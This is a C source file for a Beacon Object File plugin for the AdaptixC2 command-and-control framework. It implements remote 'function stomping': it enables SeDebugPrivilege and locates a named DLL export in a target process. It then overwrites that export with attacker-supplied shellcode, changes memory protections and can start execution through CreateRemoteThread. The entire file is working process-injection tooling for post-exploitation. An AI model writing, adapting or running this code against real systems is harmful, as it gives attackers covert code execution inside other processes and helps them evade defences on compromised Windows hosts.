/*
 * funcstomp.c — Remote Function Stomping BOF for AdaptixC2
 *
 * Overwrites an exported function in a target process with shellcode,
 * optionally triggering execution via CreateRemoteThread.
 *
 * Params (via ax.bof_pack "int,cstr,cstr,bytes,int"):
 *   int  pid       - Target process ID
 *   cstr dll       - Module name (e.g. "WinUIEdit.dll")
 *   cstr func      - Export name to stomp (e.g. "RichEditWndProc")
 *   bytes shellcode - Payload (base64 in transit, decoded by BeaconDataExtract)
 *   int  trigger   - 1 = CreateRemoteThread, 0 = stomp only
 *
 * NOTE on symbol resolution (Adaptix beacon, bof_loader.cpp / FindProcBySymbol):
 *   - MODULE$Func  -> LoadLibraryA(module) + GetProcAddress(module, func).
 *     The module MUST actually export the func. Token/security APIs live in
 *     ADVAPI32, NOT kernel32 (kernel32 does NOT export AdjustTokenPrivileges).
 *   - __imp_Beacon* -> stripped of "__imp_" then Djb2A-hashed against the fixed
 *     32-entry BeaconFunctions[] table. calloc/free/lstrcpynA are NOT in that
 *     table, so we must not use them bare. Allocation goes through MSVCRT$
 *     (resolved via DFR), string copy uses an inline helper.
 */

#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

/* ============================================================
 *  DFR (Dynamic Function Resolution) — WinAPI (kernel32)
 * ============================================================ */

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, DWORD *lpflOldProtect);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Module32First(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Module32Next(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetExitCodeThread(HANDLE hThread, LPDWORD lpExitCode);

/* Token / privilege APIs — advapi32.dll (NOT kernel32) */
DECLSPEC_IMPORT HANDLE WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);

/* CRT — the beacon does NOT provide calloc/free; pull malloc/free from msvcrt via DFR */
DECLSPEC_IMPORT void *WINAPI MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void  WINAPI MSVCRT$free(void *ptr);

/* SE_DEBUG_NAME constant (not always in MinGW headers) */
#ifndef SE_DEBUG_NAME
#define SE_DEBUG_NAME "SeDebugPrivilege"
#endif

/* ============================================================
 *  Constants
 * ============================================================ */

#define MAX_EXPORTS    8192
#define MAX_NAME_LEN   256
#define SE_DEBUG_LUID  _SE_DEBUG_PRIVILEGE  /* 0x14 */

/* ============================================================
 *  Local types
 * ============================================================ */

typedef struct {
    char      name[MAX_NAME_LEN];
    WORD      ordinal;
    DWORD     rva;
    DWORD_PTR addr;
} export_entry_t;

/* ============================================================
 *  Helpers
 * ============================================================ */

static SIZE_T xread(HANDLE hProc, DWORD_PTR addr, void *buf, SIZE_T size)
{
    SIZE_T n = 0;
    if (!KERNEL32$ReadProcessMemory(hProc, (LPCVOID)addr, buf, size, &n))
        return 0;
    return n;
}

/* Case-insensitive string compare (ASCII only) */
static int strcasecmp_a(const char *a, const char *b)
{
    while (*a && *b) {
        char ca = (*a >= 'A' && *a <= 'Z') ? (*a + 32) : *a;
        char cb = (*b >= 'A' && *b <= 'Z') ? (*b + 32) : *b;
        if (ca != cb) return ca - cb;
        a++; b++;
    }
    return (unsigned char)*a - (unsigned char)*b;
}

/* Bounded, null-terminated string copy — beacon has no lstrcpynA */
static void cpyn(char *dst, const char *src, int max)
{
    int i = 0;
    for (i = 0; i < max - 1 && src[i] != '\0'; i++)
        dst[i] = src[i];
    dst[i] = '\0';
}

/* ============================================================
 *  SeDebugPrivilege
 * ============================================================ */

static void enable_se_debug(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                   TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                   &hToken))
        return;

    if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
        KERNEL32$CloseHandle(hToken);
        return;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    KERNEL32$CloseHandle(hToken);
    /* Best-effort: if it fails we just can't access SYSTEM processes */
}

/* ============================================================
 *  Find module base in target process
 * ============================================================ */

static DWORD_PTR find_module_base(DWORD pid, const char *dll_name)
{
    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snap == INVALID_HANDLE_VALUE || snap == NULL)
        return 0;

    MODULEENTRY32 me;
    me.dwSize = sizeof(me);

    DWORD_PTR base = 0;
    if (KERNEL32$Module32First(snap, &me)) {
        do {
            if (strcasecmp_a(me.szModule, dll_name) == 0) {
                base = (DWORD_PTR)me.modBaseAddr;
                break;
            }
        } while (KERNEL32$Module32Next(snap, &me));
    }

    KERNEL32$CloseHandle(snap);
    return base;
}

/* ============================================================
 *  PE Export Table Walker (remote, architecture-agnostic)
 * ============================================================ */

static int read_exports(HANDLE hProc, DWORD_PTR base,
                         export_entry_t *out, int max)
{
    /* 1. DOS header */
    IMAGE_DOS_HEADER dos;
    if (xread(hProc, base, &dos, sizeof(dos)) != sizeof(dos))
        return -1;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE)
        return -1;

    /* 2. NT signature */
    DWORD_PTR nt_addr = base + dos.e_lfanew;
    DWORD sig;
    if (xread(hProc, nt_addr, &sig, 4) != 4 || sig != IMAGE_NT_SIGNATURE)
        return -1;

    /* 3. Optional header magic (2 bytes at offset 24 from NT start) */
    WORD opt_magic;
    DWORD_PTR opt_hdr_addr = nt_addr + 4 + sizeof(IMAGE_FILE_HEADER); /* = 24 */
    if (xread(hProc, opt_hdr_addr, &opt_magic, 2) != 2)
        return -1;

    int is_64 = (opt_magic == 0x20b);
    int dd_off = is_64 ? 112 : 96;
    DWORD_PTR dd_addr = opt_hdr_addr + dd_off;

    /* 4. Export directory entry (index 0) */
    IMAGE_DATA_DIRECTORY edd;
    if (xread(hProc, dd_addr, &edd, sizeof(edd)) != sizeof(edd))
        return -1;
    if (edd.VirtualAddress == 0 || edd.Size == 0)
        return 0;

    /* 5. IMAGE_EXPORT_DIRECTORY */
    IMAGE_EXPORT_DIRECTORY ied;
    DWORD_PTR ied_addr = base + edd.VirtualAddress;
    if (xread(hProc, ied_addr, &ied, sizeof(ied)) != sizeof(ied))
        return -1;

    DWORD nfuncs = ied.NumberOfFunctions;
    DWORD nnames = ied.NumberOfNames;
    if (nfuncs == 0 || nnames == 0)
        return 0;

    DWORD nread = (nnames < (DWORD)max) ? nnames : (DWORD)max;

    /* 6. Read arrays (heap-allocated: these are too big for the beacon's 1MB stack) */
    DWORD *funcs    = (DWORD *)MSVCRT$malloc(nfuncs * sizeof(DWORD));
    DWORD *names    = (DWORD *)MSVCRT$malloc(nnames * sizeof(DWORD));
    WORD  *ordinals = (WORD  *)MSVCRT$malloc(nnames * sizeof(WORD));
    if (!funcs || !names || !ordinals) {
        MSVCRT$free(funcs); MSVCRT$free(names); MSVCRT$free(ordinals);
        return -1;
    }

    if (xread(hProc, base + ied.AddressOfFunctions,    funcs,    nfuncs * sizeof(DWORD)) != nfuncs * sizeof(DWORD)) { MSVCRT$free(funcs); MSVCRT$free(names); MSVCRT$free(ordinals); return -1; }
    if (xread(hProc, base + ied.AddressOfNames,        names,    nnames * sizeof(DWORD)) != nnames * sizeof(DWORD)) { MSVCRT$free(funcs); MSVCRT$free(names); MSVCRT$free(ordinals); return -1; }
    if (xread(hProc, base + ied.AddressOfNameOrdinals, ordinals, nnames * sizeof(WORD))  != nnames * sizeof(WORD))  { MSVCRT$free(funcs); MSVCRT$free(names); MSVCRT$free(ordinals); return -1; }

    /* 7. Build entries */
    int count = 0;
    for (DWORD i = 0; i < nread; i++) {
        WORD ord_idx = ordinals[i];
        if (ord_idx >= nfuncs) continue;

        DWORD func_rva = funcs[ord_idx];

        /* Skip forwarded exports */
        if (func_rva >= edd.VirtualAddress &&
            func_rva <  edd.VirtualAddress + edd.Size)
            continue;

        char namebuf[MAX_NAME_LEN] = {0};
        if (xread(hProc, base + names[i], namebuf, MAX_NAME_LEN - 1) == 0)
            continue;

        cpyn(out[count].name, namebuf, MAX_NAME_LEN);
        out[count].ordinal = ord_idx;
        out[count].rva     = func_rva;
        out[count].addr    = base + func_rva;
        count++;
    }

    MSVCRT$free(funcs);
    MSVCRT$free(names);
    MSVCRT$free(ordinals);
    return count;
}

/* ============================================================
 *  Entry point
 * ============================================================ */

int go(char *args, unsigned long length)
{
    datap p;
    BeaconDataParse(&p, args, (int)length);

    int         pid       = BeaconDataInt(&p);
    char       *dll_name  = (char *)BeaconDataExtract(&p, NULL);
    char       *func_name = (char *)BeaconDataExtract(&p, NULL);
    int         sc_len    = 0;
    char       *shellcode = (char *)BeaconDataExtract(&p, &sc_len);
    int         trigger   = BeaconDataInt(&p);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] funcstomp: pid=%d dll=%s func=%s sc=%d bytes trigger=%d\n",
                 pid, dll_name, func_name, sc_len, trigger);

    /* --- Validate params --- */
    if (pid <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: invalid PID\n");
        return 1;
    }
    if (!dll_name || !func_name) {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: missing dll/func param\n");
        return 1;
    }
    if (!shellcode || sc_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: no shellcode provided\n");
        return 1;
    }
    if (sc_len > 0x100000) {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: shellcode too large (%d bytes)\n", sc_len);
        return 1;
    }

    /* --- Enable SeDebugPrivilege (best-effort) --- */
    enable_se_debug();

    /* --- Find module base in target --- */
    DWORD_PTR mod_base = find_module_base((DWORD)pid, dll_name);
    if (!mod_base) {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: module '%s' not found in PID %d\n", dll_name, pid);
        return 2;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] funcstomp: %s base=0x%llx\n", dll_name, (unsigned long long)mod_base);

    /* --- Open target process --- */
    HANDLE hProc = KERNEL32$OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
        FALSE, (DWORD)pid);
    if (!hProc) {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: OpenProcess failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return 3;
    }

    /* --- Read export table, find target function --- */
    export_entry_t *exports = (export_entry_t *)MSVCRT$malloc(MAX_EXPORTS * sizeof(export_entry_t));
    if (!exports) {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: alloc failed\n");
        KERNEL32$CloseHandle(hProc);
        return 4;
    }

    int nexports = read_exports(hProc, mod_base, exports, MAX_EXPORTS);
    if (nexports <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: no exports found in %s (rc=%d)\n", dll_name, nexports);
        MSVCRT$free(exports);
        KERNEL32$CloseHandle(hProc);
        return 5;
    }

    DWORD_PTR func_addr = 0;
    for (int i = 0; i < nexports; i++) {
        if (strcasecmp_a(exports[i].name, func_name) == 0) {
            func_addr = exports[i].addr;
            break;
        }
    }

    if (!func_addr) {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: function '%s' not in export table (%d exports)\n",
                     func_name, nexports);
        MSVCRT$free(exports);
        KERNEL32$CloseHandle(hProc);
        return 6;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] funcstomp: '%s' @ 0x%llx\n", func_name, (unsigned long long)func_addr);
    MSVCRT$free(exports);

    /* --- Stomp: RW -> write -> RX --- */
    DWORD old_prot = 0;

    if (!KERNEL32$VirtualProtectEx(hProc, (LPVOID)func_addr, (SIZE_T)sc_len,
                                    PAGE_READWRITE, &old_prot))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: VirtualProtectEx(RW) failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProc);
        return 7;
    }

    SIZE_T written = 0;
    if (!KERNEL32$WriteProcessMemory(hProc, (LPVOID)func_addr, shellcode,
                                      (SIZE_T)sc_len, &written))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: WriteProcessMemory failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProc);
        return 8;
    }

    DWORD old_prot2 = 0;
    if (!KERNEL32$VirtualProtectEx(hProc, (LPVOID)func_addr, (SIZE_T)sc_len,
                                    PAGE_EXECUTE_READWRITE, &old_prot2))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: VirtualProtectEx(RX) failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProc);
        return 9;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] funcstomp: stomped %lu bytes (old prot 0x%lx)\n",
                 (unsigned long)written, (unsigned long)old_prot);

    /* --- Optional: CreateRemoteThread --- */
    if (trigger) {
        HANDLE hThread = KERNEL32$CreateRemoteThread(hProc, NULL, 0,
                                                       (LPTHREAD_START_ROUTINE)func_addr,
                                                       NULL, 0, NULL);
        if (!hThread) {
            BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: CreateRemoteThread failed: %lu (stomp still applied)\n",
                         (unsigned long)KERNEL32$GetLastError());
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] funcstomp: remote thread created\n");
            /* Keep wait under 5s to avoid killing beacon comms */
            DWORD w = KERNEL32$WaitForSingleObject(hThread, 5000);
            if (w == WAIT_OBJECT_0) {
                DWORD ec = 0;
                KERNEL32$GetExitCodeThread(hThread, &ec);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] funcstomp: thread exited (code 0x%lx)\n", (unsigned long)ec);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] funcstomp: thread still running (5s timeout, shellcode alive)\n");
            }
            KERNEL32$CloseHandle(hThread);
        }
    }

    KERNEL32$CloseHandle(hProc);

    BeaconPrintf(CALLBACK_OUTPUT, "[=] funcstomp: done - %s::%s in PID %d\n",
                 dll_name, func_name, pid);
    return 0;
}
